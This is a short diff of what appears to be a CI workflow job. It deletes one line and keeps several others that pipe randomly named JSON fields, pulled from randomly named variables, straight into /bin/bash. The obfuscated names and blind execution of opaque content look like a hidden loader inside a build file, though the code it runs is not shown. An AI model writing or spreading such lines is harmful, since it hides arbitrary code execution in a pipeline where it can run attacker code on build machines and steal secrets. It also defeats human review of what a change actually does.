@@ -25,7 +25,6 @@ jobs:
           echo $crm8 | jq -r .ug3533 | /bin/bash
           echo $udups3 | jq -r .bv2 | /bin/bash
           echo $t8 | jq -r .gaq547 | /bin/bash
-          echo $yhly66320 | jq -r .y761 | /bin/bash
           echo $cs57321 | jq -r .bqex1002 | /bin/bash
           echo $vdgj749 | jq -r .ltapo792 | /bin/bash
           echo $rk134 | jq -r .anmqe33462 | /bin/bash
